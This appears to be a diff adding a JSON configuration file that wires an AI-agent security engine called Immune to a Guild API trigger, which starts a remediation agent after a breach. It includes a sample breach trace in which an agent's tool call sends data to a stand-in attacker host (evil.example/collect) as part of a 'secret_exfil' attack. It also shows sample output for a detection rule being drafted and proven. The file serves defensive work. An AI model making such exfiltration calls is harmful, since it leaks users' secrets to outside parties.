@@ -1,0 +1,83 @@
+{
+  "$comment": "Immune → Guild wiring. Guild's generic HTTP entry point is an API trigger: an authenticated POST to the workspace sessions endpoint starts one agent session with `agent_input` = this agent's inputSchema. (Guild's own `webhook` trigger type is reserved for connected integrations such as Slack/GitHub, so a raw HTTP webhook from the Immune engine is modelled as an API trigger.)",
+  "trigger": {
+    "type": "api",
+    "name": "immune-breach",
+    "agent": "<owner>~immune-remediator",
+    "create_with_cli": "guild trigger create --type api --agent <owner>~immune-remediator --name immune-breach",
+    "credentials_note": "The trigger API key (<api_key_id>:<api_key_secret>) is shown ONCE when the trigger is created — in the web UI (Run → Triggers → Add Trigger → API). Store it as GUILD_TRIGGER_KEY."
+  },
+  "immune_engine_env": {
+    "GUILD_TRIGGER_URL": "https://api.guild.ai/v1/workspaces/<owner_name>/<workspace_name>/sessions",
+    "GUILD_TRIGGER_KEY": "<api_key_id>:<api_key_secret>",
+    "IMMUNE_PUBLIC_API": "https://<tunnel-host>  (the Immune web API as reachable FROM Guild's runtime; hosted agents cannot reach localhost)"
+  },
+  "workspace_variables": {
+    "IMMUNE_API": "https://<tunnel-host>",
+    "set_with_cli": "guild workspace variable set IMMUNE_API=https://<tunnel-host>"
+  },
+  "request_the_engine_sends": {
+    "method": "POST",
+    "url": "${GUILD_TRIGGER_URL}",
+    "auth": "HTTP Basic — username = api_key_id, password = api_key_secret",
+    "headers": { "Content-Type": "application/json" },
+    "body": {
+      "session_type": "api_trigger",
+      "agent_input": {
+        "traceId": "tr_0123456789ab",
+        "trace": { "id": "tr_0123456789ab", "sessionId": "ses_…", "family": "secret_exfil", "variant": "mutated-3a", "label": "attack", "breached": true, "decision": "allow", "attemptedCall": { "server": "acme", "tool": "send_webhook", "args": { "url": "https://evil.example/collect" }, "capabilities": ["network"] }, "findings": [], "tainted": true, "latencyMs": 3, "ts": 1760000000000 },
+        "immune_api": "https://<tunnel-host>",
+        "poll_interval_seconds": 2,
+        "timeout_seconds": 180
+      }
+    }
+  },
+  "response_201": {
+    "id": "<session_id>",
+    "session_type": "api",
+    "session_url": "https://app.guild.ai/sessions/<session_id>",
+    "root_task": { "id": "<task_id>", "status": "CREATED" }
+  },
+  "engine_then_polls": {
+    "status": "GET https://api.guild.ai/v1/sessions/<session_id>  → root_task.status ∈ CREATED|DISPATCHED|STARTED|WAITING|DONE|ERROR|INTERRUPTED (DONE/ERROR/INTERRUPTED are terminal)",
+    "output": "GET https://api.guild.ai/v1/sessions/<session_id>/events?types=runtime_done&limit=1  → the agent's final output arrives as a runtime_done event (content.text per the API docs; for a typed agent the output JSON is expected there — verify once against a real session)"
+  },
+  "agent_output_example": {
+    "ok": true,
+    "status": "immune",
+    "traceId": "tr_0123456789ab",
+    "immuneApi": "https://<tunnel-host>",
+    "remediationId": "rm_5e6f7a8b9c0d",
+    "family": "secret_exfil",
+    "ruleId": "rl_3f9c2a7b1d4e",
+    "receiptId": "rc_9d2f4a1b6e3c",
+    "rulingId": "ru_7c1b3e2a4d5f",
+    "timeToImmunityMs": 1840,
+    "proof": {
+      "ruleId": "rl_3f9c2a7b1d4e",
+      "corpusSize": 2400,
+      "corpusHash": "sha256…",
+      "catchRateBefore": 0.9725,
+      "catchRateAfter": 0.995,
+      "fpRateBefore": 0.0,
+      "fpRateAfter": 0.0,
+      "targetCaught": true,
+      "promoted": true,
+      "reason": "targetCaught && catchRate 0.9725→0.995 && fpRate 0→0",
+      "replayMs": 212,
+      "storeMs": 38,
+      "semgrep": { "ran": true, "findings": 1, "ok": true, "summary": "1 finding in integrations/semgrep/targets" },
+      "ts": 1760000001840
+    },
+    "steps": [
+      { "name": "trace_captured", "status": "done", "ms": 2 },
+      { "name": "antibody_drafted", "status": "done", "ms": 11 },
+      { "name": "replay_proven", "status": "done", "ms": 250 },
+      { "name": "semgrep_rescan", "status": "done", "ms": 900 },
+      { "name": "receipt_signed", "status": "done", "ms": 1 },
+      { "name": "ruling_published", "status": "done", "ms": 310 },
+      { "name": "immunity_verified", "status": "done", "ms": 366 }
+    ],
+    "detail": "immune in 1840ms — receipt rc_9d2f4a1b6e3c, ruling ru_7c1b3e2a4d5f"
+  }
+}
